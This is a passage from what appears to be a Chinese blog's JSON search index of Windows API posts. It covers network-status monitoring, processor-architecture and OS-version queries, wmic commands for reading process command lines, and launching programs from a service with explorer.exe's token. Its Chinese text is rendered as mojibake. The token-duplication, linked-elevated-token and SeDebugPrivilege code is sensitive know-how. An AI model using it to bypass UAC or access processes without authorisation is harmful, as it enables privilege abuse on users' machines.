pCPContainer-&gt;FindConnectionPoint(IID_INetworkListManagerEvents, &amp;pConnectPoint); if (SUCCEEDED(Result)) &#123; DWORD Cookie = NULL; CNetworkMonitor networkMonitor; std::function&lt;void(bool)&gt; monitorFunc = std::bind(&amp;CNetworkMonitor::NetworkStatusChangedCallback, networkMonitor, std::placeholders::_1); CNetworkListManagerEvent* pNetEvent = new(std::nothrow) CNetworkListManagerEvent(monitorFunc); if (pNetEvent) &#123; Result = pConnectPoint-&gt;Advise((IUnknown*)pNetEvent, &amp;Cookie); if (SUCCEEDED(Result)) &#123; SP_DEV_LOGT(&quot;InitNetworkMonitor success&quot;); bSuccess = true; MSG msg; while (GetMessage(&amp;msg, NULL, 0, 0)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); if (msg.message == WM_QUIT) &#123; break; &#125; &#125; pConnectPoint-&gt;Unadvise(Cookie); pConnectPoint-&gt;Release(); &#125; &#125; &#125; pCPContainer-&gt;Release(); &#125; pNetworkListManager-&gt;Release(); &#125; pUnknown-&gt;Release(); &#125; CoUninitialize(); &#125; void NetworkStatusChangedCallback(bool status) &#123; g_bNetWorkOnline = status; if (status) &#123; if (g_sp_trust_model.get()) &#123; if (g_sp_trust_model-&gt;IsOnline()) &#123; //ä¼‘çœ å”¤é†’åç½‘ç»œè¿æ¥æˆåŠŸï¼Œè‡ªåŠ¨å‘é€ä¸€æ¬¡å¿ƒè·³ SP_LOGI(&quot;Sleep wakes up and automatically triggers a heartbeat&quot;); g_sp_trust_model-&gt;OnWakeToSendHeartBeat(); SP_LOGI(&quot;rebuild trust nc&quot;); if (g_sp_trust_model-&gt;Session()-&gt;NeedsL3Tunnel() &amp;&amp; !g_sp_trust_model-&gt;Session()-&gt;IsTunnelSvrsEmpty()) &#123; // ç½‘ç»œè¿æ¥æˆåŠŸåè‡ªåŠ¨è§¦å‘é‡è¿ std::thread buildUtunThread([] &#123; g_sp_trust_model-&gt;NotifyUpMessage(SP_TRUST_TOPIC_BUILD_UTUN, SPJSONObject()); &#125;); buildUtunThread.detach(); &#125; &#125; else &#123; SP_LOGI(&quot;No login, will not rebuild trust nc&quot;); &#125; &#125; else &#123; SP_LOGI(&quot;rebuild trust nc - g_sp_trust_model is null&quot;); &#125; &#125; &#125;public: void StartMonitor() &#123; std::thread monitorThread(&amp;InitNetworkMonitor); monitorThread.detach(); &#125;&#125;;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"ç›‘æ§","slug":"ç›‘æ§","permalink":"https://hodlyounger.github.io/tags/%E7%9B%91%E6%8E%A7/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€windowsã€‘æŸ¥è¯¢å¤„ç†å™¨æ¶æ„","date":"2023-10-27T01:24:02.066Z","path":"A_OS/Windows/æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯/æŸ¥è¯¢å¤„ç†å™¨æ¶æ„/","text":"é—®é¢˜ï¼š åœ¨ arm æ¶æ„çš„ windows ä¸Šä½¿ç”¨ GetSystemInfo è·å–åˆ°çš„ wProcessorArchitecture å‚æ•°ä¸å‡†ç¡®ã€‚ ç”±äº arm æ¶æ„çš„ windows æ“ä½œç³»ç»Ÿéå¸¸å°‘è§ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯ä¸Šçº¿æ—¶å¹¶æ²¡æœ‰å›å½’è¿‡æ£€æµ‹ arm æ“ä½œç³»ç»Ÿã€‚å¯¼è‡´ä¸Šçº¿åå‡ºç°é©±åŠ¨å®‰è£…å¤±è´¥é—®é¢˜ã€‚ [toc] ä½¿ç”¨ GetSystemInfo æŸ¥è¯¢ 12345678910111213141516171819202122232425262728293031323334std::string GetNcProcessorArchitecture() &#123; SYSTEM_INFO si = &#123; 0 &#125;; GetSystemInfo(&amp;si); DWORD architecture = si.wProcessorArchitecture;#if 0#define PROCESSOR_ARCHITECTURE_INTEL 0 #define PROCESSOR_ARCHITECTURE_MIPS 1 #define PROCESSOR_ARCHITECTURE_ALPHA 2#define PROCESSOR_ARCHITECTURE_PPC 3#define PROCESSOR_ARCHITECTURE_SHX 4 #define PROCESSOR_ARCHITECTURE_ARM 5 #define PROCESSOR_ARCHITECTURE_IA64 6 #define PROCESSOR_ARCHITECTURE_ALPHA64 7 #define PROCESSOR_ARCHITECTURE_MSIL 8 #define PROCESSOR_ARCHITECTURE_AMD64 9#define PROCESSOR_ARCHITECTURE_ARM64 12#endif if (architecture == PROCESSOR_ARCHITECTURE_AMD64) &#123; return &quot;amd64&quot;; &#125; else if (architecture == PROCESSOR_ARCHITECTURE_INTEL) &#123; return &quot;i386&quot;; &#125; else if (architecture == PROCESSOR_ARCHITECTURE_ARM64 || architecture == PROCESSOR_ARCHITECTURE_ARM) &#123; return &quot;arm&quot;; &#125; return &quot;&quot;; &#125; ä½¿ç”¨ GetSystemInfo æŸ¥è¯¢çš„ wProcessorArchitecture çš„å€¼ä¸º 0ã€‚ æŸ¥è¯¢æ³¨å†Œè¡¨ è°ƒç ”ä¸€ç•ªåï¼Œå‘ç°ä½¿ç”¨æ³¨å†Œè¡¨çš„æ–¹å¼æ›´ç¨³å¦¥ä¸€ç‚¹ã€‚ 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main() &#123; HKEY hKey; TCHAR processorArchitecture[255]; DWORD bufferSize = sizeof(processorArchitecture); // æ‰“å¼€æ³¨å†Œè¡¨é”® if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(&quot;SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment&quot;), 0, KEY_READ, &amp;hKey) == ERROR_SUCCESS) &#123; // è¯»å–æ³¨å†Œè¡¨å€¼ if (RegQueryValueEx(hKey, TEXT(&quot;PROCESSOR_ARCHITECTURE&quot;), nullptr, nullptr, reinterpret_cast&lt;LPBYTE&gt;(processorArchitecture), &amp;bufferSize) == ERROR_SUCCESS) &#123; std::cout &lt;&lt; &quot;Processor Architecture: &quot; &lt;&lt; processorArchitecture; &#125; // å…³é—­æ³¨å†Œè¡¨é”® RegCloseKey(hKey); &#125; return 0;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"sysinfo","slug":"sysinfo","permalink":"https://hodlyounger.github.io/tags/sysinfo/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯","slug":"A-OS/Windows/æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/"}]},{"title":"åˆ¤æ–­windowsç‰ˆæœ¬","date":"2023-10-27T01:24:02.065Z","path":"A_OS/Windows/æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯/åˆ¤æ–­windowsç‰ˆæœ¬/","text":"[toc] æ¥å£è¯´æ˜ åœ¨windowsæ“ä½œç³»ç»Ÿä¸Šï¼Œåˆ¤æ–­ç³»ç»Ÿç‰ˆæœ¬å·ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨ GetVersionEx å‡½æ•°ï¼Œä½†æ˜¯è¯¥å‡½æ•° windows8.1 ä»¥åè¢«å¯ç”¨äº†ï¼Œå°½ç®¡å¯ä»¥é€šè¿‡æ·»åŠ å®æ¥å¿½ç•¥ 4996 çš„é”™è¯¯ã€‚åœ¨æ–°çš„APIä¸­æä¾›äº†æ–°çš„æ¥å£ä»¥ä¾›åˆ¤æ–­æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼š Versionhelpers.h æ ‡å¤´ - Win32 apps | Microsoft Learn å£°æ˜çš„å® æœ¬æ–‡ä»‹ç»å¦‚ä½•ä½¿ç”¨ IsWindowsVersionOrGreater å’Œ verifyVersionInfoW å‡½æ•°ã€‚ å…³äºå¦‚ä½•æŸ¥è¯¢windowsç‰ˆæœ¬å·å¯ä»¥çœ‹è¿™ä¸ªæ–‡æ¡£ï¼š æ›´æ–° WINVER å’Œ _WIN32_WINNT | Microsoft Learn Windowså„ä¸ªç‰ˆæœ¬çš„å® æ‰€éœ€çš„æœ€ä½ç³»ç»Ÿ NTDDI_VERSIONçš„å€¼ Windows 10 1903 â€œ19H1â€ NTDDI_WIN10_19H1 (0x0A000007) Windows 10 1809 â€œçº¢çŸ³ 5â€ NTDDI_WIN10_RS5 (0x0A000006) Windows 10 1803 â€œçº¢çŸ³ 4â€ NTDDI_WIN10_RS4 (0x0A000005) Windows 10 1709 â€œçº¢çŸ³ 3â€ NTDDI_WIN10_RS3 (0x0A000004) Windows 10 1703 â€œçº¢çŸ³ 2â€ NTDDI_WIN10_RS2 (0x0A000003) Windows 10 1607 â€œçº¢çŸ³ 1â€ NTDDI_WIN10_RS1 (0x0A000002) Windows 10 1511â€œé˜ˆå€¼ 2â€ NTDDI_WIN10_TH2 (0x0A000001) Windows 10 1507â€œé˜ˆå€¼â€ NTDDI_WIN10 (0x0A000000) Windows 8.1 NTDDI_WINBLUE (0x06030000) Windows 8 NTDDI_WIN8 (0x06020000) Windows 7 NTDDI_WIN7 (0x06010000) Windows Server 2008 NTDDI_WS08 (0x06000100) Windows Vista Service Pack 1 (SP1) NTDDI_VISTASP1 (0x06000100) Windows Vista NTDDI_VISTA (0x06000000) Windows Server 2003 Service Pack 2 (SP2) NTDDI_WS03SP2 (0x05020200) å¸¦æœ‰ Service Pack 1 (SP1) çš„ Windows Server 2003 NTDDI_WS03SP1 (0x05020100) Windows Server 2003 NTDDI_WS03 (0x05020000) Windows XP Service Pack 3 (SP3) NTDDI_WINXPSP3 (0x05010300) Windows XP Service Pack 2 (SP2) NTDDI_WINXPSP2 (0x05010200) Windows XP Service Pack 1 (SP1) NTDDI_WINXPSP1 (0x05010100) Windows XP NTDDI_WINXP (0x05010000) è¡¥å…… å…³äº å‡½æ•°çš„ä¸‰ä¸ªå‚æ•°çš„è¾“å…¥å¯ä»¥å‚è€ƒæ–‡æ¡£ä¸­å®šä¹‰çš„å®ï¼š 123#define OSVER(Version) ((Version) &amp; OSVERSION_MASK)#define SPVER(Version) (((Version) &amp; SPVERSION_MASK) &gt;&gt; 8)#define SUBVER(Version) (((Version) &amp; SUBVERSION_MASK) ) é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å®è·å–ä¸‰ä¸ªç‰ˆæœ¬å·ï¼š 1234567891011/*LOWORD()å¾—åˆ°ä¸€ä¸ª32bitæ•°çš„ä½16bit HIWORD()å¾—åˆ°ä¸€ä¸ª32bitæ•°çš„é«˜16bitLOBYTE()å¾—åˆ°ä¸€ä¸ª16bitæ•°æœ€ä½ï¼ˆæœ€å³è¾¹ï¼‰é‚£ä¸ªå­—èŠ‚HIBYTE()å¾—åˆ°ä¸€ä¸ª16bitæ•°æœ€é«˜ï¼ˆæœ€å·¦è¾¹ï¼‰é‚£ä¸ªå­—èŠ‚*/#define LOWORD(l) ((WORD)(((DWORD_PTR)(l)) &amp; 0xffff))#define HIWORD(l) ((WORD)((((DWORD_PTR)(l)) &gt;&gt; 16) &amp; 0xffff))#define LOBYTE(w) ((BYTE)(((DWORD_PTR)(w)) &amp; 0xff))#define HIBYTE(w) ((BYTE)((((DWORD_PTR)(w)) &gt;&gt; 8) &amp; 0xff)) ç¤ºä¾‹ IsWindowsVersionOrGreater å‡½æ•°æ˜¯ Windows API ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ£€æŸ¥å½“å‰è¿è¡Œçš„æ“ä½œç³»ç»Ÿç‰ˆæœ¬æ˜¯å¦æ»¡è¶³æŒ‡å®šçš„æ¡ä»¶ã€‚ä»¥ä¸‹æ˜¯è¯¥å‡½æ•°çš„ä¸€äº›å¸¸è§ç”¨æ³•ï¼š æ£€æŸ¥ç‰¹å®šç‰ˆæœ¬åŠä»¥ä¸Šçš„ Windows ç‰ˆæœ¬ï¼š 1234567#include &lt;Windows.h&gt;// ç¤ºä¾‹ï¼šæ£€æŸ¥ Windows 7 åŠä»¥ä¸Šç‰ˆæœ¬if (IsWindowsVersionOrGreater(6, 1, 0))&#123; // åœ¨ Windows 7 æˆ–æ›´é«˜ç‰ˆæœ¬ä¸Šæ‰§è¡ŒæŸäº›æ“ä½œ&#125; æ£€æŸ¥ç‰¹å®šç‰ˆæœ¬å’Œ Service Pack çš„ Windows ç‰ˆæœ¬ï¼š 1234567#include &lt;Windows.h&gt;// ç¤ºä¾‹ï¼šæ£€æŸ¥ Windows 10 ç‰ˆæœ¬ 1809ï¼ˆç§‹å­£åˆ›æ„è€…æ›´æ–°ï¼‰åŠä»¥ä¸Šç‰ˆæœ¬if (IsWindowsVersionOrGreater(10, 0, 17763))&#123; // åœ¨ Windows 10 ç‰ˆæœ¬ 1809ï¼ˆç§‹å­£åˆ›æ„è€…æ›´æ–°ï¼‰æˆ–æ›´é«˜ç‰ˆæœ¬ä¸Šæ‰§è¡ŒæŸäº›æ“ä½œ&#125; æ£€æŸ¥æ˜¯å¦ä¸ºç‰¹å®š Windows Server ç‰ˆæœ¬ï¼š 1234567#include &lt;Windows.h&gt;// ç¤ºä¾‹ï¼šæ£€æŸ¥æ˜¯å¦ä¸º Windows Server 2016 ç‰ˆæœ¬if (IsWindowsVersionOrGreater(HIBYTE(_WIN32_WINNT_WIN10), LOBYTE(_WIN32_WINNT_WIN10), 0))&#123; // åœ¨ Windows Server 2016 æˆ–æ›´é«˜ç‰ˆæœ¬ä¸Šæ‰§è¡ŒæŸäº›æ“ä½œ&#125; æ£€æŸ¥ç‰¹å®šç‰ˆæœ¬ã€Service Pack å’Œäº§å“ç±»å‹çš„ Windows ç‰ˆæœ¬ï¼š 1234567#include &lt;Windows.h&gt;// ç¤ºä¾‹ï¼šæ£€æŸ¥ Windows 8.1 Update ç‰ˆæœ¬ä¸”ä¸ºå·¥ä½œç«™ç±»å‹if (IsWindowsVersionOrGreater(6, 3, 0, VER_GREATER_EQUAL, VER_NT_WORKSTATION))&#123; // åœ¨ Windows 8.1 Update ç‰ˆæœ¬ä¸”ä¸ºå·¥ä½œç«™ç±»å‹ä¸Šæ‰§è¡ŒæŸäº›æ“ä½œ&#125; è¿™äº›ç¤ºä¾‹å¯ä»¥å¸®åŠ©ä½ ç†è§£ IsWindowsVersionOrGreater å‡½æ•°çš„å„ç§ç”¨æ³•ï¼Œä½ å¯ä»¥æ ¹æ®å®é™…éœ€æ±‚åœ¨ä»£ç ä¸­é€‚å½“è°ƒæ•´å‚æ•°å’Œæ¡ä»¶ã€‚ è¯·æ³¨æ„ï¼ŒIsWindowsVersionOrGreater æ˜¯ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“å‡½æ•°ï¼Œåœ¨ä½¿ç”¨æ—¶éœ€è¦åŒ…å« &lt;Windows.h&gt; å¤´æ–‡ä»¶ï¼Œä¸”éœ€è¦é“¾æ¥åˆ° Version.lib åº“ã€‚ åˆ¤æ–­ dwPlatformId dwPlatformId å­—æ®µè¯´æ˜ åœ¨ Windows ç³»ç»Ÿä¸­ï¼Œå¸¸ç”¨çš„å¹³å°æ ‡è¯†ï¼ˆPlatform IDï¼‰å®šä¹‰å¦‚ä¸‹ï¼š VER_PLATFORM_WIN32sï¼šè¡¨ç¤º Win32s å­ç³»ç»Ÿï¼Œå®ƒæ˜¯ä¸º Windows 3.1 æä¾›çš„ä¸€ä¸ªæ‰©å±•è¿è¡Œç¯å¢ƒï¼Œä½¿å¾—éƒ¨åˆ† 32 ä½åº”ç”¨ç¨‹åºå¯ä»¥åœ¨ Windows 3.1 ä¸Šè¿è¡Œã€‚ VER_PLATFORM_WIN32_WINDOWSï¼šè¡¨ç¤º Windows 9x ç³»åˆ—æ“ä½œç³»ç»Ÿï¼ŒåŒ…æ‹¬ Windows 95ã€Windows 98 å’Œ Windows MEã€‚è¿™äº›æ“ä½œç³»ç»Ÿéƒ½æ˜¯åŸºäº MS-DOS çš„ã€‚ VER_PLATFORM_WIN32_NTï¼šè¡¨ç¤º Windows NT ç³»åˆ—æ“ä½œç³»ç»Ÿï¼ŒåŒ…æ‹¬ Windows NTã€Windows 2000ã€Windows XPã€Windows Server 2003ã€Windows Vistaã€Windows 7ã€Windows 8ã€Windows 10 ç­‰ç‰ˆæœ¬ã€‚è¿™äº›æ“ä½œç³»ç»Ÿæ˜¯åŸºäºå…¨æ–°çš„å†…æ ¸è®¾è®¡çš„ï¼Œå¹¶å…·æœ‰æ›´å¼ºå¤§çš„åŠŸèƒ½å’Œç¨³å®šæ€§ã€‚ æ¯ä¸ªå¹³å°æ ‡è¯†å¯¹åº”ä¸åŒçš„æ“ä½œç³»ç»Ÿç³»åˆ—ï¼Œå› æ­¤åœ¨å¼€å‘åº”ç”¨ç¨‹åºæ—¶ï¼Œæ ¹æ®éœ€è¦é€‰æ‹©æ­£ç¡®çš„å¹³å°æ ‡è¯†æ˜¯å¾ˆé‡è¦çš„ã€‚ åˆ¤æ–­ 1234567891011121314bool IsWindowsNT()&#123; OSVERSIONINFOEX osvi; ZeroMemory(&amp;osvi, sizeof(OSVERSIONINFOEX)); osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX); // osvi.dwPlatformId = VER_PLATFORM_WIN32s; // osvi.dwPlatformId = VER_PLATFORM_WIN32_WINDOWS; osvi.dwPlatformId = VER_PLATFORM_WIN32_NT; DWORDLONG conditionMask = 0; VER_SET_CONDITION(conditionMask, VER_PLATFORMID, VER_EQUAL); return VerifyVersionInfo(&amp;osvi, VER_PLATFORMID, conditionMask);&#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"os","slug":"os","permalink":"https://hodlyounger.github.io/tags/os/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯","slug":"A-OS/Windows/æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/"}]},{"title":"ã€windowsã€‘æŸ¥çœ‹è¿›ç¨‹å¯åŠ¨å‚æ•°å‘½ä»¤è¡Œ","date":"2023-10-27T01:24:02.064Z","path":"A_OS/Windows/API/ã€winapiã€‘æŸ¥çœ‹è¿›ç¨‹å¯åŠ¨å‘½ä»¤è¡Œå‚æ•°/","text":"Windows æŸ¥çœ‹è¿›ç¨‹å¯åŠ¨å‚æ•°å‘½ä»¤è¡Œ ä½¿ç”¨wmicæŸ¥çœ‹ 1wmic process where caption=&quot;ã€è¿›ç¨‹åã€‘&quot; get caption,commandline /value ä¹Ÿå¯ä»¥é€šè¿‡æ‰“å°æ‰€æœ‰çš„å‘½ä»¤è¡Œå‚æ•° 1wmic process get caption,commandline /value | findstr &quot;ã€è¿›ç¨‹åï¼Œç‰¹å¾å­—ç¬¦ä¸²ç­‰ã€‘&quot; ä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨æŸ¥çœ‹ æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ï¼Œåœ¨è¯¦ç»†ä¿¡æ¯æ ï¼Œå³å‡»æ ‡é¢˜åˆ—-&gt;é€‰æ‹©åˆ—ï¼Œæ‰¾åˆ°å‘½ä»¤è¡Œï¼Œå‹¾é€‰å³å¯ã€‚","tags":[{"name":"Windows/cmd","slug":"Windows-cmd","permalink":"https://hodlyounger.github.io/tags/Windows-cmd/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€æƒé™ä¸ä¼šè¯ã€‘é™æƒ","date":"2023-10-27T01:24:02.063Z","path":"A_OS/Windows/æƒé™ä¸ä¼šè¯/ã€æƒé™ä¸ä¼šè¯ã€‘é™æƒ/","text":"é˜…è¯»è¿™ç¯‡æ–‡ç« ä½ å¯ä»¥äº†è§£ï¼š é™æƒæ“ä½œï¼ŒWindowsæœåŠ¡è¿›ç¨‹ä¸­ä»¥ä½æƒé™åˆ›å»ºè¿›ç¨‹ [toc] ã€æƒé™ä¸ä¼šè¯ã€‘ Serviceé™æƒå¯åŠ¨è¿›ç¨‹ ã€æƒé™ä¸ä¼šè¯ã€‘ææƒå·¥å…· ã€æƒé™ä¸ä¼šè¯ã€‘ææƒ èƒŒæ™¯è¯´æ˜ åœ¨æœåŠ¡ç¨‹åºä¸­è°ƒç”¨äº†æŸä¸€ä¸ªç¨‹åºçš„å®‰è£…ç¨‹åºï¼Œç”±äºæƒé™çš„é—®é¢˜ï¼Œè¿™ä¸ªå®‰è£…ç¨‹åºä¹Ÿç»§æ‰¿äº†æœåŠ¡çš„ SYSTEM æƒé™ï¼Œå¯¼è‡´å®‰è£…ç¨‹åºä¸é¢„æœŸä¸ç¬¦åˆã€‚ è§£å†³æ–¹æ¡ˆ æœ€ç»ˆå®ç°çš„ç›®æ ‡å°±æ˜¯åœ¨æœåŠ¡ä¸­ä»¥æ™®é€šç”¨æˆ·çš„æƒé™å»å¯åŠ¨å®‰è£…ç¨‹åºï¼Œè¦ä»¥æ™®é€šç”¨æˆ·å»å¯åŠ¨ï¼Œå°±æ¶‰åŠåˆ°é™æƒçš„é—®é¢˜ï¼Œéœ€è¦è·å–ç”¨æˆ·çš„ä¿¡æ¯ã€‚åœ¨ä»»åŠ¡ç®¡ç†å™¨è¯¦ç»†ä¿¡æ¯ä¸­å¯ä»¥çœ‹åˆ°ï¼Œèµ„æºç®¡ç†å™¨æ˜¯ä»¥æ™®é€šç”¨æˆ·çš„èº«ä»½å¯åŠ¨çš„ï¼Œå› æ­¤å¯ä»¥åœ¨æœåŠ¡ä¸­ä»¥ Explore.exe çš„æƒé™å»è°ƒç”¨å®‰è£…ç¨‹åºã€‚ å®ç°é€»è¾‘ æ­¤é€»è¾‘ä¹Ÿå¯ä»¥ç”¨äºè§£å†³ UAC å¼¹çª—çš„é—®é¢˜ã€‚ è·å–token é€šè¿‡tokenè·å–ç”¨æˆ·çš„ä¼šè¯ID é€šè¿‡tokenå’ŒIDå¯åŠ¨è¿›ç¨‹ ä»£ç  æ¥å£ æœ€ç»ˆè°ƒç”¨çš„æ¥å£ä¸ºï¼š CreateProcessAsUser 12345678910111213141516int ExecutePackage(LPCSTR pszPath, LPCSTR pszParams)&#123; if (nullptr == pszPath) return -1; wstring szPath = stringToWstring(pszPath); wstring szParams; if (pszParams) &#123; szParams = stringToWstring(pszParams); &#125; CreateProcessWithAdmin(szPath.c_str(), szParams.c_str()); return 0;&#125; å®ç° å®ç°å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/** @fn * @brief CreateProcessWithAdmin* @param[in] * strpathï¼š ç¨‹åºè·¯å¾„* strParams: ç¨‹åºæ‰§è¡Œå‘½ä»¤* @param[out] * @return * * @detail */bool CreateProcessWithAdmin(LPCWSTR lpExePath, LPCWSTR lpParam)&#123; HANDLE hExplorerToken = GetExplorerToken(); HANDLE hTokenDup = NULL; LPVOID pEnvironment = nullptr; bool res&#123; false &#125;; char szErr[256] = &#123; 0 &#125;; int iErrCode = 0; do &#123; if (hExplorerToken == NULL) &#123; iErrCode = GetLastError(); break; &#125; // å¤åˆ¶ä»¤ç‰Œ,æŠŠè°ƒç”¨æ–¹æœ‰æ•ˆçš„æ‰€æœ‰è®¿é—®æƒé™ç»™å¤åˆ¶åçš„ä»¤ç‰Œ. DWORD dwReturnBytes = 0; DWORD dwReturnLen = 0; DWORD dwTokenSessionId = 0; // é€šè¿‡tokenè·å–sessionId if (::GetTokenInformation(hExplorerToken, TokenSessionId, &amp;dwTokenSessionId, sizeof(DWORD), &amp;dwReturnLen) == FALSE) &#123; break; &#125; // é€šè¿‡ SessionId å’Œ Tokenè¿è¡Œç¨‹åº- res = _CreateProcessAsSystemBySession(lpExePath, lpParam, NULL, dwTokenSessionId, hExplorerToken); // æ”¹åŠ¨å¦‚ä¸‹æ‰€ç¤º // æ”¹åŠ¨ // åˆ¤æ–­å½“å‰ç‰¹æƒtokenæ˜¯å¦å·²æå‡ï¼Œå¦‚æœå·²ç»æå‡ï¼Œåˆ™ç›´æ¥é€šè¿‡å½“å‰çš„tokenå¯åŠ¨ï¼Œå¦‚æœæœªæå‡ï¼Œåˆ™é€šè¿‡æå‡åçš„tokenå¯åŠ¨+ HANDLE hNewToken = NULL;+ if (GetElevatedToken(hExplorerToken, &amp;hNewToken) &amp;&amp; hNewToken)+ &#123;+ res = CreateProcessByToken(hNewToken, hExplorerToken, lpExePath, lpParam, NULL, FALSE);+ CloseHandle(hNewToken);+ &#125;+ else+ &#123;+ res = CreateProcessAsSystemBySession(lpExePath, lpParam, NULL, dwTokenSessionId, hExplorerToken);+ &#125;+ CloseHandle(hExplorerToken); &#125; while (false); return res;&#125; åˆ¤æ–­tokenæ˜¯å¦è¢«æå‡ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152BOOL IsElevatedToken(HANDLE hToken, PBOOL pbElevated)&#123; DWORD dwReturnBytes = 0; DWORD dwElevateionType = 0; BOOL bElevated = FALSE; if (hToken &amp;&amp; pbElevated) &#123; if (GetTokenInformation(hToken, TokenElevationType, &amp;dwElevateionType, sizeof(dwElevateionType), &amp;dwReturnBytes)) &#123; if (dwElevateionType == TokenElevationTypeFull) bElevated = TRUE; else if (dwElevateionType == TokenElevationTypeDefault) &#123; TOKEN_ELEVATION te; ZeroMemory(&amp;te, sizeof(te)); if (GetTokenInformation(hToken, TokenElevation, &amp;te, sizeof(te), &amp;dwReturnBytes)) &#123; if (te.TokenIsElevated) bElevated = TRUE; &#125; &#125; &#125; if (pbElevated) *pbElevated = bElevated; return TRUE; &#125; return FALSE;&#125;BOOL GetElevatedToken(HANDLE hToken, PHANDLE phNewToken)&#123; BOOL bElevated = FALSE; IsElevatedToken(hToken, &amp;bElevated); if (bElevated) &#123; return DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, phNewToken); &#125; else &#123; DWORD dwReturnBytes = 0; return GetTokenInformation(hToken, TokenLinkedToken, phNewToken, sizeof(HANDLE), &amp;dwReturnBytes); &#125; return FALSE;&#125; è·å–èµ„æºç®¡ç†å™¨çš„ token 1234567891011121314151617181920212223242526272829303132333435363738HANDLE GetExplorerToken()&#123; PromotePrivilege(); HANDLE hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapshot == INVALID_HANDLE_VALUE) &#123; return NULL; &#125; HANDLE hExplorerToken = NULL; PROCESSENTRY32 pe = &#123; 0 &#125;; pe.dwSize = sizeof(pe); BOOL bMore = ::Process32First(hSnapshot, &amp;pe); while (bMore) &#123; if (StrCmpI(L&quot;explorer.exe&quot;, pe.szExeFile) == 0) &#123; HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID); if (hProcess == NULL) &#123; continue; &#125; if (OpenProcessToken(hProcess, TOKEN_QUERY, &amp;hExplorerToken)) &#123; CloseHandle(hProcess); break; &#125; &#125; bMore = ::Process32Next(hSnapshot, &amp;pe); &#125; CloseHandle(hSnapshot); return hExplorerToken;&#125; ç»™æœ¬è¿›ç¨‹ç‰¹æƒï¼Œä»¥ä¾¿è®¿é—®ç³»ç»Ÿè¿›ç¨‹ 123456789101112131415161718192021222324252627282930313233343536373839404142/** @fn PromotePrivilege* @brief è°ƒæ•´è¿›ç¨‹æƒé™ * * @detail å°†è¿›ç¨‹æƒé™æå‡æˆå…·æœ‰è°ƒè¯•æƒé™çš„è¿›ç¨‹ï¼Œè¿™ä¸ªæƒé™åº”è¯¥æ˜¯è¿›ç¨‹æ‰€èƒ½å…·æœ‰çš„æœ€å¤§æƒé™* å‰æå¯åŠ¨è¿™ä¸ªè¿›ç¨‹çš„è´¦æˆ·å¿…é¡»æ˜¯ä¸€ä¸ªç®¡ç†å‘˜ï¼Œå¦åˆ™æ²¡æ³•æå‡*/BOOL PromotePrivilege()&#123; // é™„ç»™æœ¬è¿›ç¨‹ç‰¹æƒ,ä»¥ä¾¿è®¿é—®ç³»ç»Ÿè¿›ç¨‹ HANDLE hToken; // æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œ if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123; // å–å¾—ç‰¹æƒåç§°ä¸º&quot;SetDebugPrivilege&quot;çš„LUID LUID uID; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;uID)) &#123; CloseHandle(hToken); return FALSE; &#125; // è°ƒæ•´ç‰¹æƒçº§åˆ« TOKEN_PRIVILEGES tp; 